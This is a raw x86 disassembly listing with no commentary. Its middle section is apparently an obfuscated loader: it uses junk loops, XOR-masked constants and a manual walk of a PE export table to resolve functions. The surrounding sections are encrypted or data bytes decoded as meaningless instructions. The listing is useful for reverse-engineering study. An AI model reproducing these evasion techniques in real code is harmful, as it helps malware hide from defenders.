  40a7ac:	xchg   esp,eax
  40a7ad:	aaa    
  40a7ae:	mov    dl,0x8
  40a7b0:	test   eax,0xbd6cf5e
  40a7b5:	push   edx
  40a7b6:	jg     0x40a813
  40a7b8:	mov    BYTE PTR [ecx-0x71],cl
  40a7bb:	imul   esi,DWORD PTR [edx+0x44],0xffffffcb
  40a7bf:	adc    bh,dl
  40a7c1:	fstp   st(4)
  40a7c3:	aad    0xe5
  40a7c5:	cmp    BYTE PTR [edi],0x6c
  40a7c8:	adc    BYTE PTR [ecx+0x1634afcf],ch
  40a7ce:	and    al,0x9e
  40a7d0:	lods   al,BYTE PTR ds:[esi]
  40a7d1:	dec    esp
  40a7d2:	lahf   
  40a7d3:	repz test DWORD PTR [ebx+0x5b95bc10],edx
  40a7da:	push   eax
  40a7db:	mov    bp,0x4986
  40a7df:	mov    ds:0x7110a5a3,al
  40a7e4:	sbb    BYTE PTR [edx+edx*1-0xc2cc1e7],bl
  40a7eb:	(bad)  
  40a7ec:	sti    
  40a7ed:	add    eax,DWORD PTR [ecx]
  40a7ef:	mov    ds:0x1d1212bf,eax
  40a7f4:	out    0x5b,al
  40a7f6:	sbb    esp,edx
  40a7f8:	mov    eax,eax
  40a7fa:	add    eax,0x8f56cb7b
  40a7ff:	cmp    eax,0xa6f3fb73
  40a804:	mov    esp,0x7043fad3
  40a809:	push   edx
  40a80a:	inc    ecx
  40a80b:	jae    0x40a7b9
  40a80d:	inc    esp
  40a80e:	test   eax,0xd72dcdb6
  40a813:	or     dl,bh
  40a815:	and    eax,0x772f8a85
  40a81a:	mov    bh,0x8
  40a81c:	or     BYTE PTR [edx],al
  40a81e:	xchg   ebp,eax
  40a81f:	fldenv [edi]
  40a821:	xor    al,0xf1
  40a823:	pop    eax
  40a824:	sbb    esp,edi
  40a826:	mov    BYTE PTR [eax+0x5f],0x96
  40a82a:	mov    ds:0xefc23bec,al
  40a82f:	repnz (bad) 
  40a831:	xlat   BYTE PTR ds:[ebx]
  40a832:	fwait
  40a833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a834:	sbb    BYTE PTR [ebx+0x7070090f],ah
  40a83a:	xor    al,0xab
  40a83c:	mov    bl,0x68
  40a83e:	repz sub BYTE PTR [esi+eax*8],ah
  40a842:	cmp    al,0x1c
  40a844:	dec    ebx
  40a845:	and    ebp,DWORD PTR [ebx-0x2bc4d5ad]
  40a84b:	xchg   esp,eax
  40a84c:	jno    0x40a83e
  40a84e:	fldcw  WORD PTR [edi+0x1ca01d2a]
  40a854:	call   0xf3f1ca1a
  40a859:	ins    WORD PTR es:[edi],dx
  40a85b:	call   0x2b61:0x18b0ec07
  40a862:	fwait
  40a863:	mov    dl,0x31
  40a865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a866:	adc    DWORD PTR [eax+0x63],esp
  40a869:	mov    ch,0x80
  40a86b:	pusha  
  40a86c:	inc    ebp
  40a86d:	cwde   
  40a86e:	push   ecx
  40a86f:	jg     0x40a851
  40a871:	cwde   
  40a872:	mov    dl,0xab
  40a874:	jnp    0x40a8bb
  40a876:	push   esi
  40a877:	mov    BYTE PTR [eax-0x77],al
  40a87a:	add    eax,0xa5009bf6
  40a87f:	and    BYTE PTR [edi-0x3f1850e0],al
  40a885:	call   0x18464e54
  40a88a:	inc    ebp
  40a88b:	ja     0x40a833
  40a88d:	inc    eax
  40a88e:	loope  0x40a8a7
  40a890:	std    
  40a891:	cmp    ebp,DWORD PTR [edi+0x52]
  40a894:	lods   eax,DWORD PTR ds:[esi]
  40a895:	pop    edx
  40a896:	fwait
  40a897:	mov    ch,BYTE PTR [ebp+0x1118dc4f]
  40a89d:	dec    ecx
  40a89e:	adc    BYTE PTR [edi],bh
  40a8a0:	ins    BYTE PTR es:[edi],dx
  40a8a1:	shl    al,cl
  40a8a3:	fsub   QWORD PTR [edi-0x19fedb8e]
  40a8a9:	add    al,0xc5
  40a8ab:	jae    0x40a866
  40a8ad:	data16 mov bh,0x2e
  40a8b0:	jmp    0x40a915
  40a8b2:	mov    al,ds:0xe4ab1772
  40a8b7:	mov    al,0x67
  40a8b9:	cdq    
  40a8ba:	xor    eax,0x44b25f54
  40a8bf:	jp     0x40a8e2
  40a8c1:	sbb    esi,ebx
  40a8c3:	pop    es
  40a8c4:	sub    DWORD PTR [ebp-0x46f7683b],eax
  40a8ca:	into   
  40a8cb:	imul   edx,ebp,0x2c9f8d04
  40a8d1:	push   ebp
  40a8d2:	hlt    
  40a8d3:	fdiv   DWORD PTR [ebx-0xd]
  40a8d6:	fist   WORD PTR [ebx-0x3d0716e3]
  40a8dc:	fisub  WORD PTR [ebp+0x7995cbf]
  40a8e2:	jmp    0x2167eb0a
  40a8e7:	dec    ebx
  40a8e8:	aaa    
  40a8e9:	and    eax,0x42f4dca4
  40a8ee:	dec    edi
  40a8ef:	gs and al,0x7d
  40a8f2:	stos   DWORD PTR es:[edi],eax
  40a8f3:	adc    al,0x2f
  40a8f5:	imul   esp,DWORD PTR [esp+eiz*2-0x2d],0xfffffff4
  40a8fa:	and    bh,dh
  40a8fc:	lock imul esi,DWORD PTR [ebp+0x4],0xfffffffd
  40a901:	add    al,al
  40a903:	jl     0x40a97e
  40a905:	into   
  40a906:	ja     0x40a8bb
  40a908:	stos   BYTE PTR es:[edi],al
  40a909:	mov    al,0x5b
  40a90b:	arpl   WORD PTR [eax],di
  40a90d:	mov    al,ds:0xb17572cd
  40a912:	pop    esi
  40a913:	push   edx
  40a914:	mov    esi,gs
  40a916:	les    ebx,FWORD PTR [edi+0x58]
  40a919:	inc    eax
  40a91a:	jl     0x40a95e
  40a91c:	imul   ebx,DWORD PTR [esp+edi*1],0x7d
  40a920:	mov    ds:0xca4a9f3,al
  40a925:	jns    0x40a92d
  40a927:	je     0x40a985
  40a929:	inc    edi
  40a92a:	ds xchg esp,eax
  40a92c:	scas   eax,DWORD PTR es:[edi]
  40a92d:	dec    eax
  40a92e:	outs   dx,BYTE PTR ds:[esi]
  40a92f:	adc    al,0x74
  40a931:	adc    eax,0x1d1161f9
  40a936:	shl    BYTE PTR [ecx+0x38],1
  40a939:	pop    edx
  40a93a:	push   es
  40a93b:	mov    gs:0x259d39fd,al
  40a941:	outs   dx,DWORD PTR ds:[esi]
  40a942:	xchg   edi,eax
  40a943:	fbld   TBYTE PTR [edx+0x2a56db3b]
  40a949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a94a:	xchg   edx,eax
  40a94b:	pop    ebp
  40a94c:	out    dx,al
  40a94d:	xchg   ebp,eax
  40a94e:	inc    ecx
  40a94f:	and    dl,bh
  40a951:	dec    esi
  40a952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a953:	dec    edx
  40a954:	mov    dl,dl
  40a956:	addr16 pop esi
  40a958:	in     eax,0x58
  40a95a:	in     eax,0xb7
  40a95c:	xchg   ebp,eax
  40a95d:	aaa    
  40a95e:	test   al,0xee
  40a960:	ret    
  40a961:	aaa    
  40a962:	sbb    dl,BYTE PTR [esi-0x49]
  40a965:	jo     0x40a935
  40a967:	sbb    dh,BYTE PTR [edi+0xe]
  40a96a:	jmp    0x40a984
  40a96c:	ins    DWORD PTR es:[edi],dx
  40a96d:	push   cs
  40a96e:	xchg   esi,eax
  40a96f:	or     BYTE PTR [eax-0x65e2510c],0x84
  40a976:	int3   
  40a977:	nop
  40a978:	and    dh,BYTE PTR [edx]
  40a97a:	mov    ebp,0xe6604ba1
  40a97f:	pop    esp
  40a980:	ss pusha 
  40a982:	hlt    
  40a983:	enter  0xd15,0x82
  40a987:	cwde   
  40a988:	retf   0xf999
  40a98b:	test   DWORD PTR [ecx],eax
  40a98d:	push   edx
  40a98e:	add    BYTE PTR [edx],cl
  40a990:	sub    DWORD PTR [ebx-0x2a],ebp
  40a993:	lods   eax,DWORD PTR ds:[esi]
  40a994:	mov    ebp,0x37527719
  40a999:	shl    BYTE PTR [ecx],cl
  40a99b:	repz xchg esp,eax
  40a99d:	jle    0x40a9fb
  40a99f:	leave  
  40a9a0:	jg     0x40aa01
  40a9a2:	aas    
  40a9a3:	das    
  40a9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a5:	or     cl,BYTE PTR [ecx+0x53]
  40a9a8:	pop    esi
  40a9a9:	add    al,0xb6
  40a9ab:	sub    al,0xbf
  40a9ad:	dec    edx
  40a9ae:	mov    al,BYTE PTR [esi+0x51]
  40a9b1:	mov    esi,0xec92c22c
  40a9b6:	pushf  
  40a9b7:	mov    ah,0x23
  40a9b9:	cmp    DWORD PTR [ecx],edi
  40a9bb:	adc    DWORD PTR [esi+0x36],0xffffffda
  40a9bf:	push   eax
  40a9c0:	push   eax
  40a9c1:	loop   0x40aa39
  40a9c3:	sub    DWORD PTR [esi-0x2982a177],0xffffff82
  40a9ca:	mov    ch,0xfe
  40a9cc:	xor    al,0x55
  40a9ce:	test   eax,0x5c2a8b75
  40a9d3:	mul    BYTE PTR [edi+0x4bc1c073]
  40a9d9:	dec    edx
  40a9da:	xchg   DWORD PTR [ecx-0x38db74cd],ecx
  40a9e0:	and    DWORD PTR [ecx+0xe507087],ebx
  40a9e6:	jge    0x40a982
  40a9e8:	xchg   edx,eax
  40a9e9:	push   ecx
  40a9ea:	mov    ?,WORD PTR [esi+0x5128ad06]
  40a9f0:	imul   dl
  40a9f2:	dec    esp
  40a9f3:	xlat   BYTE PTR ds:[ebx]
  40a9f4:	mov    eax,ds:0xd197d165
  40a9f9:	jae    0x40a9f4
  40a9fb:	jge    0x40a981
  40a9fd:	mov    esi,0x369ff35e
  40aa02:	ret    0x5b5
  40aa05:	mov    ds:0x837114b9,al
  40aa0a:	outs   dx,BYTE PTR ds:[esi]
  40aa0b:	mov    dh,0x75
  40aa0d:	fmul   st(4),st
  40aa0f:	mov    al,0xa0
  40aa11:	xor    ebx,DWORD PTR [edi+0x10]
  40aa14:	dec    ebp
  40aa15:	js     0x40aa03
  40aa17:	adc    ecx,esp
  40aa19:	pop    eax
  40aa1a:	cmp    DWORD PTR [eax+0x61],edx
  40aa1d:	or     al,al
  40aa1f:	idiv   BYTE PTR [edx-0x6794ac4c]
  40aa25:	cmp    edx,DWORD PTR [edi+ebx*2-0x32]
  40aa29:	dec    esi
  40aa2a:	pop    eax
  40aa2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2c:	call   DWORD PTR ds:0x425014
  40aa32:	push   0x97898797
  40aa37:	or     DWORD PTR ds:0x42a008,0x42d008
  40aa41:	call   DWORD PTR ds:0x425004
  40aa47:	and    DWORD PTR ds:0x42c01c,0x0
  40aa51:	mov    ebx,DWORD PTR ds:0x42c01c
  40aa57:	inc    ebx
  40aa58:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa5e:	cmp    DWORD PTR ds:0x42c01c,0x5
  40aa65:	jne    0x40aa76
  40aa6b:	push   0x57f5
  40aa70:	call   DWORD PTR ds:0x42504c
  40aa76:	cmp    DWORD PTR ds:0x42c01c,0x4
  40aa7d:	jne    0x40aa92
  40aa83:	xor    ebx,ebx
  40aa85:	xor    ebx,DWORD PTR ds:0x42c01c
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa92:	cmp    DWORD PTR ds:0x42c01c,0x10
  40aa99:	jb     0x40aa51
  40aa9f:	xor    eax,eax
  40aaa1:	xor    eax,DWORD PTR ds:0x42a014
  40aaa7:	xor    DWORD PTR ds:0x42d018,eax
  40aaad:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  40aab4:	or     ecx,DWORD PTR ds:0x42d008
  40aaba:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aac1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aac4:	or     DWORD PTR ds:0x42b014,edi
  40aaca:	mov    ebx,0x7510893
  40aacf:	xor    eax,eax
  40aad1:	or     eax,DWORD PTR ds:0x423e6c
  40aad7:	mov    eax,DWORD PTR [eax]
  40aad9:	or     DWORD PTR ds:0x42d018,eax
  40aadf:	xor    ecx,ebx
  40aae1:	not    eax
  40aae3:	mov    eax,0x3272db
  40aae8:	or     DWORD PTR ds:0x42c010,0x42900c
  40aaf2:	add    ecx,eax
  40aaf4:	mov    DWORD PTR [ebp-0x1c],ecx
  40aaf7:	mov    DWORD PTR ds:0x42c014,0x14
  40ab01:	cmp    DWORD PTR ds:0x42c014,0x0
  40ab08:	je     0x40aba7
  40ab0e:	cmp    DWORD PTR ds:0x42c014,0x2
  40ab15:	jne    0x40ab29
  40ab1b:	push   DWORD PTR [ebp-0x28]
  40ab1e:	push   0x42457a
  40ab23:	call   DWORD PTR ds:0x425010
  40ab29:	cmp    DWORD PTR ds:0x42c014,0x3
  40ab30:	jne    0x40ab43
  40ab36:	mov    ecx,DWORD PTR ds:0x42c014
  40ab3c:	dec    ecx
  40ab3d:	mov    DWORD PTR ds:0x42c014,ecx
  40ab43:	mov    ecx,DWORD PTR ds:0x42c014
  40ab49:	dec    ecx
  40ab4a:	mov    DWORD PTR ds:0x42c014,ecx
  40ab50:	jmp    0x40ab01
  40ab55:	mov    DWORD PTR ds:0x42a018,0x12
  40ab5f:	cmp    DWORD PTR ds:0x42a018,0x0
  40ab66:	je     0x40aba7
  40ab6c:	cmp    DWORD PTR ds:0x42a018,0x1a
  40ab73:	jne    0x40ab85
  40ab79:	push   DWORD PTR [ebp-0x1c]
  40ab7c:	push   DWORD PTR [ebp-0x18]
  40ab7f:	call   DWORD PTR ds:0x425018
  40ab85:	mov    ecx,DWORD PTR ds:0x42a018
  40ab8b:	dec    ecx
  40ab8c:	mov    DWORD PTR ds:0x42a018,ecx
  40ab92:	jmp    0x40ab5f
  40ab97:	xor    ecx,ecx
  40ab99:	xor    ecx,DWORD PTR ds:0x4245e3
  40ab9f:	mov    ecx,DWORD PTR [ecx]
  40aba1:	sbb    DWORD PTR ds:0x42a00c,ecx
  40aba7:	mov    ecx,DWORD PTR [ebp+0x14]
  40abaa:	test   ecx,ecx
  40abac:	je     0x40ac29
  40abb2:	and    DWORD PTR ds:0x42c014,edi
  40abb8:	mov    ecx,DWORD PTR [ebp+0x14]
  40abbb:	mov    DWORD PTR ds:0x42c014,0x11
  40abc5:	cmp    DWORD PTR ds:0x42c014,0x0
  40abcc:	je     0x40ac1e
  40abd2:	cmp    DWORD PTR ds:0x42c014,0x5
  40abd9:	jne    0x40abf2
  40abdf:	push   0x429028
  40abe4:	push   DWORD PTR [ebp-0x20]
  40abe7:	push   0x4243ee
  40abec:	call   DWORD PTR ds:0x42501c
  40abf2:	cmp    DWORD PTR ds:0x42c014,0x6
  40abf9:	jne    0x40ac0c
  40abff:	mov    edi,DWORD PTR ds:0x42c014
  40ac05:	dec    edi
  40ac06:	mov    DWORD PTR ds:0x42c014,edi
  40ac0c:	mov    edi,DWORD PTR ds:0x42c014
  40ac12:	dec    edi
  40ac13:	mov    DWORD PTR ds:0x42c014,edi
  40ac19:	jmp    0x40abc5
  40ac1e:	mov    ecx,DWORD PTR [ecx]
  40ac20:	xor    DWORD PTR ds:0x42a018,ecx
  40ac26:	mov    DWORD PTR [ebp-0x1c],ecx
  40ac29:	adc    DWORD PTR ds:0x429024,edi
  40ac2f:	mov    ecx,0x7665
  40ac34:	imul   edx,eax
  40ac37:	mov    DWORD PTR ds:0x42d00c,0x1b
  40ac41:	cmp    DWORD PTR ds:0x42d00c,0x0
  40ac48:	je     0x40ac9b
  40ac4e:	cmp    DWORD PTR ds:0x42d00c,0x4
  40ac55:	jne    0x40ac69
  40ac5b:	push   0x429020
  40ac60:	push   DWORD PTR [ebp-0x1c]
  40ac63:	call   DWORD PTR ds:0x425020
  40ac69:	cmp    DWORD PTR ds:0x42d00c,0x5
  40ac70:	jne    0x40ac83
  40ac76:	mov    edi,DWORD PTR ds:0x42d00c
  40ac7c:	dec    edi
  40ac7d:	mov    DWORD PTR ds:0x42d00c,edi
  40ac83:	mov    edi,DWORD PTR ds:0x42d00c
  40ac89:	dec    edi
  40ac8a:	mov    DWORD PTR ds:0x42d00c,edi
  40ac90:	jmp    0x40ac41
  40ac95:	xor    DWORD PTR ds:0x42b010,edi
  40ac9b:	mov    esi,0x76532
  40aca0:	add    edx,ecx
  40aca2:	xchg   esi,ecx
  40aca4:	or     edi,esi
  40aca6:	mov    edi,0x54354
  40acab:	movzx  ecx,BYTE PTR ds:0x42901c
  40acb2:	sbb    DWORD PTR ds:0x429000,ecx
  40acb8:	sub    edx,edi
  40acba:	mov    ecx,DWORD PTR [ebp-0x4]
  40acbd:	sbb    DWORD PTR ds:0x429028,0x4a48
  40acc7:	xor    ecx,ebx
  40acc9:	and    esi,DWORD PTR ds:0x42900c
  40accf:	add    ecx,eax
  40acd1:	mov    DWORD PTR [ebp-0x8],ecx
  40acd4:	mov    DWORD PTR ds:0x42b014,0x169
  40acde:	mov    ecx,DWORD PTR [ebp-0x14]
  40ace1:	add    esi,DWORD PTR ds:0x42b000
  40ace7:	xor    ecx,ebx
  40ace9:	add    DWORD PTR ds:0x42d00c,0x42d004
  40acf3:	add    ecx,eax
  40acf5:	mov    DWORD PTR [ebp-0x24],ecx
  40acf8:	and    esi,esi
  40acfa:	mov    ecx,DWORD PTR [ebp-0x4]
  40acfd:	and    DWORD PTR ds:0x42b000,0x0
  40ad07:	jmp    0x40ad19
  40ad0c:	mov    esi,DWORD PTR ds:0x42b000
  40ad12:	inc    esi
  40ad13:	mov    DWORD PTR ds:0x42b000,esi
  40ad19:	cmp    DWORD PTR ds:0x42b000,0x10
  40ad20:	jae    0x40ad70
  40ad26:	cmp    DWORD PTR ds:0x42b000,0x4
  40ad2d:	jne    0x40ad3e
  40ad33:	push   0x8810
  40ad38:	call   DWORD PTR ds:0x425028
  40ad3e:	cmp    DWORD PTR ds:0x42b000,0x3
  40ad45:	jne    0x40ad58
  40ad4b:	mov    esi,DWORD PTR ds:0x42b000
  40ad51:	inc    esi
  40ad52:	mov    DWORD PTR ds:0x42b000,esi
  40ad58:	jmp    0x40ad0c
  40ad5d:	movzx  esi,WORD PTR ds:0x42d00c
  40ad64:	adc    esi,DWORD PTR ds:0x42b018
  40ad6a:	mov    DWORD PTR ds:0x42d00c,esi
  40ad70:	xor    ecx,ebx
  40ad72:	add    ecx,eax
  40ad74:	add    esi,0x75ba
  40ad7a:	mov    DWORD PTR [ebp-0x30],ecx
  40ad7d:	or     ecx,DWORD PTR ds:0x42c010
  40ad83:	mov    esi,DWORD PTR [ebp-0x4]
  40ad86:	inc    ecx
  40ad87:	xor    esi,ebx
  40ad89:	mov    ecx,DWORD PTR ds:0x4245cb
  40ad8f:	mov    ecx,DWORD PTR [ecx]
  40ad91:	adc    DWORD PTR ds:0x429020,ecx
  40ad97:	add    esi,eax
  40ad99:	mov    ecx,DWORD PTR [ebp-0x24]
  40ad9c:	sub    DWORD PTR ds:0x42c010,0x42c004
  40ada6:	sub    ecx,eax
  40ada8:	lea    edx,[esi-0x3272db]
  40adae:	xor    DWORD PTR ds:0x42a004,0x429028
  40adb8:	xor    ecx,ebx
  40adba:	xor    edx,ebx
  40adbc:	mov    DWORD PTR ds:0x42b00c,0x3cf6
  40adc6:	cmp    edx,ecx
  40adc8:	mov    DWORD PTR ds:0x42a008,0x130c
  40add2:	je     0x40afdf
  40add8:	sub    ecx,0x2467
  40adde:	mov    ecx,DWORD PTR [ebp-0x4]
  40ade1:	and    DWORD PTR ds:0x42c00c,0x42d01c
  40adeb:	xor    ecx,ebx
  40aded:	add    DWORD PTR ds:0x42b018,0x2ea9
  40adf7:	add    ecx,eax
  40adf9:	mov    DWORD PTR ds:0x42b000,0x737d
  40ae03:	cmp    esi,ecx
  40ae05:	mov    DWORD PTR ds:0x42b018,0x3d4e
  40ae0f:	jne    0x40afbc
  40ae15:	push   DWORD PTR [ebp+0x8]
  40ae18:	call   0x423bf2
  40ae1d:	mov    DWORD PTR [ebp-0x18],eax
  40ae20:	mov    eax,DWORD PTR [ebp-0x4]
  40ae23:	xor    edi,ecx
  40ae25:	mov    ecx,DWORD PTR [ebp-0x18]
  40ae28:	xor    eax,ebx
  40ae2a:	and    DWORD PTR ds:0x42901c,0x0
  40ae34:	jmp    0x40ae46
  40ae39:	mov    edi,DWORD PTR ds:0x42901c
  40ae3f:	inc    edi
  40ae40:	mov    DWORD PTR ds:0x42901c,edi
  40ae46:	cmp    DWORD PTR ds:0x42901c,0x1d
  40ae4d:	jae    0x40ae90
  40ae53:	cmp    DWORD PTR ds:0x42901c,0x2c
  40ae5a:	jne    0x40ae85
  40ae60:	push   0x61ef
  40ae65:	push   0x288b
  40ae6a:	push   0x42d018
  40ae6f:	push   DWORD PTR [ebp-0x28]
  40ae72:	push   0x2975
  40ae77:	push   DWORD PTR [ebp-0x24]
  40ae7a:	push   0x26ce
  40ae7f:	call   DWORD PTR ds:0x42502c
  40ae85:	jmp    0x40ae39
  40ae8a:	or     DWORD PTR ds:0x42c010,ebx
  40ae90:	mov    edi,0x3272db
  40ae95:	add    eax,edi
  40ae97:	mov    DWORD PTR ds:0x42901c,0x5f35
  40aea1:	cmp    ecx,eax
  40aea3:	mov    DWORD PTR ds:0x42c018,0x19df
  40aead:	je     0x40b04f
  40aeb3:	sub    DWORD PTR ds:0x42d018,0x5f9c
  40aebd:	push   DWORD PTR [ebp-0x18]
  40aec0:	and    DWORD PTR ds:0x42b018,0x42b000
  40aeca:	push   DWORD PTR [ebp+0x8]
  40aecd:	dec    DWORD PTR ds:0x42a00c
  40aed3:	call   0x423cd1
  40aed8:	or     DWORD PTR ds:0x42a014,0x42a00c
  40aee2:	mov    DWORD PTR [ebp-0x18],eax
  40aee5:	mov    eax,DWORD PTR [ebp-0x4]
  40aee8:	sbb    DWORD PTR ds:0x42a010,0x3b6d
  40aef2:	mov    ecx,DWORD PTR [ebp-0x18]
  40aef5:	xor    eax,ebx
  40aef7:	add    DWORD PTR ds:0x429004,0x42d004
  40af01:	add    eax,edi
  40af03:	mov    DWORD PTR ds:0x42a018,0x317f
  40af0d:	cmp    ecx,eax
  40af0f:	je     0x40b04f
  40af15:	mov    eax,DWORD PTR [ebp-0x18]
  40af18:	mov    eax,DWORD PTR [eax+0x18]
  40af1b:	mov    ecx,DWORD PTR ds:0x42d000
  40af21:	xor    DWORD PTR ds:0x42a014,ecx
  40af27:	mov    DWORD PTR [ebp-0x24],eax
  40af2a:	mov    eax,DWORD PTR [ebp-0x18]
  40af2d:	and    DWORD PTR ds:0x42b018,0x0
  40af37:	jmp    0x40af49
  40af3c:	mov    ecx,DWORD PTR ds:0x42b018
  40af42:	inc    ecx
  40af43:	mov    DWORD PTR ds:0x42b018,ecx
  40af49:	cmp    DWORD PTR ds:0x42b018,0x16
  40af50:	jae    0x40af77
  40af56:	cmp    DWORD PTR ds:0x42b018,0x20
  40af5d:	jne    0x40af6c
  40af63:	push   DWORD PTR [ebp-0x28]
  40af66:	call   DWORD PTR ds:0x425030
  40af6c:	jmp    0x40af3c
  40af71:	xor    ecx,DWORD PTR ds:0x42b01c
  40af77:	mov    ecx,DWORD PTR [ebp+0x8]
  40af7a:	add    ecx,DWORD PTR [eax+0x20]
  40af7d:	sub    eax,DWORD PTR ds:0x429024
  40af83:	mov    DWORD PTR [ebp-0x2c],ecx
  40af86:	mov    eax,DWORD PTR [ebp-0x18]
  40af89:	inc    ecx
  40af8a:	mov    ecx,DWORD PTR [ebp+0x8]
  40af8d:	add    ecx,DWORD PTR [eax+0x24]
  40af90:	mov    DWORD PTR [ebp-0x34],ecx
  40af93:	xor    DWORD PTR ds:0x42a004,edi
  40af99:	mov    eax,DWORD PTR [ebp-0x18]
  40af9c:	or     DWORD PTR ds:0x42a000,ebx
  40afa2:	mov    ecx,DWORD PTR [ebp+0x8]
  40afa5:	or     DWORD PTR ds:0x42a008,0x109d
  40afaf:	add    ecx,DWORD PTR [eax+0x1c]
  40afb2:	mov    eax,edi
  40afb4:	mov    DWORD PTR [ebp-0x18],ecx
  40afb7:	jmp    0x40b017
  40afbc:	mov    ecx,DWORD PTR [ebp-0x2c]
  40afbf:	mov    edx,DWORD PTR [ebp+0x8]
  40afc2:	add    edx,DWORD PTR [ecx+esi*4]
  40afc5:	mov    DWORD PTR [ebp-0x28],edx
  40afc8:	mov    ecx,DWORD PTR [ebp-0x4]
  40afcb:	mov    edx,DWORD PTR [ebp-0x28]
  40afce:	xor    ecx,ebx
  40afd0:	add    ecx,eax
  40afd2:	cmp    edx,ecx
  40afd4:	je     0x40b017
  40afda:	jmp    0x40b003
  40afdf:	mov    ecx,DWORD PTR [ebp-0x4]
  40afe2:	mov    edx,DWORD PTR [ebp-0x8]
  40afe5:	xor    ecx,ebx
  40afe7:	add    ecx,eax
  40afe9:	cmp    edx,ecx
  40afeb:	je     0x40b05b
  40aff1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aff4:	mov    edx,DWORD PTR [ebp-0x30]
  40aff7:	xor    ecx,ebx
  40aff9:	add    ecx,eax
  40affb:	cmp    edx,ecx
  40affd:	je     0x40b06a
  40b003:	lea    eax,[ebp-0x8]
  40b006:	push   eax
  40b007:	push   DWORD PTR [ebp-0x28]
  40b00a:	push   DWORD PTR [ebp+0xc]
  40b00d:	call   0x401058
  40b012:	mov    eax,0x3272db
  40b017:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01a:	mov    edx,DWORD PTR [ebp-0x8]
  40b01d:	xor    ecx,ebx
  40b01f:	add    ecx,eax
  40b021:	cmp    edx,ecx
  40b023:	je     0x40b03e
  40b029:	mov    ecx,DWORD PTR [ebp-0x34]
  40b02c:	movzx  ecx,WORD PTR [ecx+esi*2]
  40b030:	mov    edx,DWORD PTR [ebp-0x18]
  40b033:	mov    ecx,DWORD PTR [edx+ecx*4]
  40b036:	mov    DWORD PTR [ebp-0x38],ecx
  40b039:	jmp    0x40afdf
  40b03e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b041:	xor    ecx,ebx
  40b043:	lea    esi,[esi+ecx*1+0x3272db]
  40b04a:	jmp    0x40ad99
  40b04f:	mov    eax,DWORD PTR [ebp-0x4]
  40b052:	xor    eax,ebx
  40b054:	add    eax,edi
  40b056:	jmp    0x40f898
  40b05b:	mov    eax,DWORD PTR [ebp-0x4]
  40b05e:	xor    eax,ebx
  40b060:	add    eax,0x3272db
  40b065:	jmp    0x40f898
  40b06a:	mov    ecx,DWORD PTR [ebp-0x38]
  40b06d:	add    ecx,DWORD PTR [ebp+0x8]
  40b070:	mov    DWORD PTR [ebp-0x10],ecx
  40b073:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b076:	test   ecx,ecx
  40b078:	je     0x40d4be
  40b07e:	mov    DWORD PTR [ebp-0x20],0x0
  40b085:	push   0x3
  40b087:	xor    edx,edx
  40b089:	pop    edx
  40b08a:	add    edx,0x8
  40b08d:	push   edx
  40b08e:	pop    ecx
  40b08f:	push   0x6
  40b091:	dec    ecx
  40b092:	pop    ebx
  40b093:	dec    ebx
  40b094:	xchg   ebx,ecx
  40b096:	sub    ebx,ecx
  40b098:	xchg   ebx,ecx
  40b09a:	dec    ecx
  40b09b:	mov    eax,DWORD PTR [ebp-0x1c]
  40b09e:	imul   eax,ecx
  40b0a1:	sub    esp,eax
  40b0a3:	mov    DWORD PTR [ebp-0x20],esp
  40b0a6:	mov    eax,DWORD PTR [ebp-0x4]
  40b0a9:	mov    ecx,0x7510893
  40b0ae:	xor    eax,ecx
  40b0b0:	mov    edx,0x3272db
  40b0b5:	add    eax,edx
  40b0b7:	mov    DWORD PTR [ebp+0x8],eax
  40b0ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b0bd:	xor    eax,ecx
  40b0bf:	add    eax,edx
  40b0c1:	mov    edx,DWORD PTR [ebp+0x14]
  40b0c4:	jmp    0x40d429
  40b0c9:	fidiv  DWORD PTR [ecx+0x21]
  40b0cc:	jb     0x40b137
  40b0ce:	xor    ch,BYTE PTR [ecx-0x57]
  40b0d1:	ss pop es
  40b0d3:	add    eax,0xfe9cca9b
  40b0d8:	xor    ebp,eax
  40b0da:	cmc    
  40b0db:	bound  esp,QWORD PTR [edx+0x3a]
  40b0de:	pop    edi
  40b0df:	bound  esp,QWORD PTR [edx+0x61]
  40b0e2:	popf   
  40b0e3:	jnp    0x40b11d
  40b0e5:	sti    
  40b0e6:	(bad)  
  40b0e7:	sbb    ecx,eax
  40b0e9:	pop    ebp
  40b0ea:	and    ebp,eax
  40b0ec:	in     eax,0x90
  40b0ee:	popf   
  40b0ef:	sbb    DWORD PTR ds:0xd64ce4c1,ebp
  40b0f5:	sar    BYTE PTR [edx+0x7b],0x8f
  40b0f9:	pop    ecx
  40b0fa:	ret    
  40b0fb:	adc    ecx,ebp
  40b0fd:	inc    ebx
  40b0fe:	dec    esi
  40b0ff:	out    0xdf,al
  40b101:	xor    BYTE PTR [ebp-0x63],ah
  40b104:	adc    BYTE PTR [edx+edx*2],ah
  40b107:	std    
  40b108:	fsubp  st(6),st
  40b10a:	clc    
  40b10b:	out    dx,eax
  40b10c:	gs push 0xffffffbd
  40b10f:	ret    0x9b56
  40b112:	mov    ah,0x16
  40b114:	add    ecx,DWORD PTR [ecx-0x42]
  40b117:	jge    0x40b11d
  40b119:	imul   esp,DWORD PTR [ebp+0x77],0xffffffd8
  40b11d:	jns    0x40b0f3
  40b11f:	inc    ecx
  40b120:	shl    BYTE PTR [esi-0x1b],0x6c
  40b124:	adc    al,dh
  40b126:	sub    al,0xbd
  40b128:	arpl   WORD PTR [esi],sp
  40b12a:	sbb    DWORD PTR [edx],edx
  40b12c:	inc    ecx
  40b12d:	lock (bad) 
  40b12f:	fild   WORD PTR [ebp+0x6ba71da8]
  40b135:	(bad)  
